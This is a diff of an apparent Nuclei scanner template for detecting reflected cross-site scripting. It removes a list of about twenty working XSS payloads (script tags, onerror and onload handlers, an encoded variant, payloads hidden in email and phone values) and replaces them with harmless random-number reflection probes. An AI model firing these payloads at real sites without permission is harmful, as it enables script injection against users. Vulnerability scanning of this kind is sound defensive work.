@@ -1,45 +1,38 @@
 id: reflected-xss
 
 info:
-  name: Reflected Cross Site Scripting
-  author: rix4uni
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
   severity: medium
+  metadata:
+    max-request: 1
   tags: xss,rxss,dast
 
+variables:
+  first: "{{rand_int(10000, 99999)}}"
+
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
 
     payloads:
       reflection:
-        - "<sCript>confirm(1)</sCript>"    #custom
-        - "<script>confirm(1)</script>"    #custom
-        - '"><script>confirm(1)</script>'    #custom
-        - '"<image/src/onerror=confirm(1)>'    #custom
-        - "<scr<script>ipt>alert(1)</scr</script>ipt>"    #custom
-        - "</script><script>alert(1)</script>"    #https://twitter.com/mamunwhh/status/1636732300171022337
-        - "<img src=x onerror=confirm(1)>"    #custom
-        - '"><img src=x onerror=alert(document.domain)>'    #https://twitter.com/abdlah_md/status/1558003867568291844
-        - '<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>'   #https://twitter.com/gonzxph/status/1656445477783748608
-        # - 'javascript:alert(1)'   #https://twitter.com/mamunwhh/status/1590028838800883713
-        - '"><svg onload=prompt(document.domain)>'    #https://twitter.com/kab33rrr/status/1524464126608560128
-        - '"/><svg/onload=confirm(/xxs/)>'    #https://twitter.com/Manorr07/status/1564280686000934920
-        - '"><img src=x onerror=prompt(1);>'    #https://twitter.com/abdlah_md/status/1559332579802812424
-        - '"<img/src/onerror=alert(0)"@xss.com'   #https://twitter.com/bug_vs_me/status/1635006251108294656
-        - '"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com'    #https://twitter.com/ynsmroztas/status/1635026291140468736
-        - '+441134960000;phone-context=<script>alert(1)</script>'   #https://twitter.com/intigriti/status/1604054094808760321
-        - '%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E'  #https://twitter.com/MeAsHacker_HNA/status/1663070164353523712
-        - '<iframe src="javascript:alert(document.domain)"/>'   #https://twitter.com/ehsayaan/status/1663202463275704321
-        - '"><svg/onload=alert(1)//'    #https://twitter.com/ehsayaan/status/1663202463275704321
-        - '<video src=x onloadstart=alert(document.domain)/>'   #https://twitter.com/ehsayaan/status/1584514744232292353
-        - '<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>'   #https://twitter.com/gonzxph/status/1656445477783748608
-        - '<iframe srcdoc="<img src=x onerror=alert(999)'   #https://twitter.com/RoundR0b1n/status/1657597515326185472
+        - "'\"><{{first}}>"
+        - "'><{{first}}>"
+        - "\"><{{first}}>"
 
     fuzzing:
       - part: query
-        type: replace
-        mode: multiple
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
         fuzz:
           - "{{reflection}}"
 
@@ -55,3 +48,4 @@ http:
         part: header
         words:
           - "text/html"
+# digest: 4a0a00473045022100b946e6f2777bc795532ee437c3d501e3a0dda1c5bb31838576a7ae90d9862af102203bce6702443ca30f8c1fd96869c24c442f0d920e8b2db0bab68413c30b9756c9:922c64590222798bb761d5b6d8e72950
